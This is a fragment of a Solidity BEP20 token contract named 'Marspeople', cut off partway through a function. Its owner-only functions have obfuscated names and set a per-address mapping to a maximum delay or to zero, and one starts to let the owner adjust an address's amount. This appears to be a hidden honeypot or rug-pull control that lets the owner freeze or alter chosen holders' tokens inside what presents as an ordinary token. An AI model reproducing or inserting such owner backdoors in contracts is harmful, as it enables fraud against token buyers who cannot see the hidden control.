...
contract Marspeople is IBEP20, HasForeignAsset {
    ...
    function getMarspeople17340ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setMarspeople17340reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupMarspeople17340ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupMarspeople17340Aasses(address booadndd,uint256 nuum) public onlyOwner {
